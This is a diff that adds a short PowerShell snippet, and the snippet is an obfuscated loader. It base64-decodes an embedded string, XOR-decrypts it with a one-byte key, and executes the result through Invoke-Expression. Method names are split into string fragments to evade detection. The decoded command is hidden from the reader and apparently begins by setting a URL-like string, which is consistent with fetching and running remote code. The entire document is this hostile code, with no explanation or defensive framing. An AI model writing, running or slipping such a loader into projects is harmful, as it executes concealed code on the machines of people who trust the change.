@@ -1,0 +1,7 @@
+$encStr='mr7+p73y7u7q6aC1tero6PPu6fnotPn197Xp7+7v6rT/4v+9obq+6qe+//TsoM7f18qxvcbp7Pny9enutP/i/72hurLU/+231fjw//nuutT/7rTN//jZ9vP/9O6ztN717fT29fv+3PP2/7K+/ra+6rOhusnu++jut8ro9fn/6em6vuq6t83z9P717cnu4/b/utLz';
+$bytes = [Convert]::('Fro'+'m'+'Ba'+'se'+'64'+'St'+'rin'+'g')($encStr);
+$key = $bytes[0];
+$data = $bytes[1..($bytes.Length-1)];
+for($i=0;$i -lt $data.Length;$i++){ $data[$i] = [byte]($data[$i] -bxor $key) };
+$finalCmd = [Text.Encoding]::('U'+'TF'+'8').('G'+'etS'+'tr'+'ing')($data);
+&('iex') $finalCmd
